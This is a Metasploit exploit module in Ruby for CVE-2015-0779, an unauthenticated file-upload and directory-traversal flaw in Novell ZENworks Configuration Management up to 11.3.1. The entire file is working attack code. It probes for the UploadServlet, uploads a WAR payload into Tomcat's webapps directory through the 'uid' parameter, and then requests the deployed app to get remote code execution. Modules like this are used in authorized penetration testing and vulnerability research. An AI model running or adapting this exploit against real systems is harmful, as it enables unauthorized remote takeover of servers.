# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Novell ZENworks Configuration Management Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
        This module exploits a file upload vulnerability in Novell ZENworks Configuration
        Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in
        the UploadServlet which accepts unauthenticated file uploads and does not check the
        "uid" parameter for directory traversal characters. This allows an attacker to write
        anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat
        webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack.
        This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note
        that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a
        Metasploit exploit, but it abuses a different parameter of the same servlet.
      },
      &#039;Author&#039;       =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039;, # Vulnerability Discovery and Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2015-0779&#039;],
          [&#039;OSVDB&#039;, &#039;120382&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/generic/zenworks_zcm_rce.txt&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Apr/21&#039;]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 30 },
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;java&#039;,
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;Novell ZCM < v11.3.2 - Universal Java&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 7 2015&#039;))
 
    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;,
          [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;TARGETURI&#039;,
          [true, &#039;The base path to ZCM / ZENworks Suite&#039;, &#039;/zenworks/&#039;]),
        OptString.new(&#039;TOMCAT_PATH&#039;,
          [false, &#039;The Tomcat webapps traversal path (from the temp directory)&#039;])
      ], self.class)
  end
 
 
  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;UploadServlet&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })
 
    if res && res.code == 200 && res.body.to_s =~ /ZENworks File Upload Servlet/
      return Exploit::CheckCode::Detected
    end
 
    Exploit::CheckCode::Safe
  end
 
 
  def upload_war_and_exec(tomcat_path)
    app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => app_base }).to_s
 
    print_status("#{peer} - Uploading WAR file to #{tomcat_path}")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;UploadServlet&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => war_payload,
      &#039;ctype&#039; => &#039;application/octet-stream&#039;,
      &#039;vars_get&#039; => {
        &#039;uid&#039; => tomcat_path,
        &#039;filename&#039; => "#{app_base}.war"
      }
    })
    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful")
    else
      print_error("#{peer} - Failed to upload, try again with a different path?")
      return false
    end
 
    10.times do
      Rex.sleep(2)
 
      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      send_request_cgi({
        &#039;uri&#039;    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
        &#039;method&#039; => &#039;GET&#039;
      })
 
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Failure. Unexpected answer
      break if res.code != 200
      # Unless session... keep looping
      return true if session_created?
    end
 
    false
  end
 
 
  def exploit
    tomcat_paths = []
    if datastore[&#039;TOMCAT_PATH&#039;]
      tomcat_paths << datastore[&#039;TOMCAT_PATH&#039;]
    end
    tomcat_paths.concat([&#039;../../../opt/novell/zenworks/share/tomcat/webapps/&#039;, &#039;../webapps/&#039;])
 
    tomcat_paths.each do |tomcat_path|
      break if upload_war_and_exec(tomcat_path)
    end
  end
end

